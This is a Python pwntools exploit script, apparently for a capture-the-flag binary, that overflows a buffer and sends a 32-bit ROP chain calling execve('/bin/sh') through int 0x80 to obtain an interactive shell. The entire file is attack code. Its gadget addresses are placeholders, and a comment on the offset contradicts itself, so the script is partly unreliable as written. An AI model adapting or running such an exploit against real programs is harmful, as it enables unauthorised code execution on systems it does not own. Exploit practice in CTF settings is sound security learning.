from pwn import *
import sys
def exploit(binary_path):
    # Start the process
    io = process(binary_path)

    # Find the offset to the return address
    offset = cyclic_find(0x61616161)  # Replace 0x61616161 with the actual offset

    # Load the binary and find gadgets
    elf = ELF(binary_path)
    rop = ROP(elf)

    # Find the execve gadget or use a ROP chain to set up the syscall
    # For example, we can use the following gadgets:
    # pop eax; ret
    # pop ebx; ret
    # pop ecx; ret
    # pop edx; ret
    # int 0x80

    # These addresses are placeholders and need to be replaced with actual gadget addresses
    pop_eax = 0x08048436  # Example address for pop eax; ret
    pop_ebx = 0x08048437  # Example address for pop ebx; ret
    pop_ecx = 0x08048438  # Example address for pop ecx; ret
    pop_edx = 0x08048439  # Example address for pop edx; ret
    int_0x80 = 0x0804843a  # Example address for int 0x80

    # Address of "/bin/sh" string in the binary
    bin_sh_addr = next(elf.search(b'/bin/sh'))

    # Craft the ROP chain
    rop_chain = [
        pop_eax, 0xb,  # execve syscall number
        pop_ebx, bin_sh_addr,  # Address of "/bin/sh"
        pop_ecx, 0,  # NULL
        pop_edx, 0,  # NULL
        int_0x80  # Trigger the syscall
    ]

    # Convert the ROP chain to bytes
    payload = b'A' * offset
    payload += b''.join(p32(addr) for addr in rop_chain)

    # Send the payload
    io.sendline(payload)

    # Interact with the shell
    io.interactive()

if __name__ == '__main__':
    binary_path = './pwn/integer/int-2/int2'
    exploit(binary_path)
